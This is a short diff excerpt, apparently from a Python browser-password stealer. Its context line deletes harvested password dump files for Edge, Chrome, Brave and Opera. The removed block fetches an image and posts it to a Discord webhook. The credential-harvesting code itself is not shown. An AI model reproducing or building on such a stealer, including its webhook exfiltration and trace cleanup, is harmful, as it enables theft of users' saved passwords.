@@ -397,29 +397,3 @@ os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt Opera
 #######################################################################
 #END OF SCRIPT
 #######################################################################
-# Image Implementation
-def capture_and_send_image(webhook_url, image_address):
-    try:
-        image = Image.open(BytesIO(requests.get(image_address).content))
-        image.show()
-        data = {
-            "content": f"Image: {image_address}",
-            "embeds": [
-                {
-                    "title": "Captured Image",
-                    "image": {"url": image_address}
-                }
-            ]
-        }
-        send_to_discord(webhook_url, data)
-        print("Image sent to Discord webhook.")
-    except Exception as e:
-        print(f"Failed to capture or send image: {e}")
-
-def main():
-    webhook_url = input("Enter the Discord webhook URL: ")
-    image_address = input("Enter the image address (URL of the PNG image): ")
-    capture_and_send_image(webhook_url, image_address)
-
-if __name__ == "__main__":
-    main()
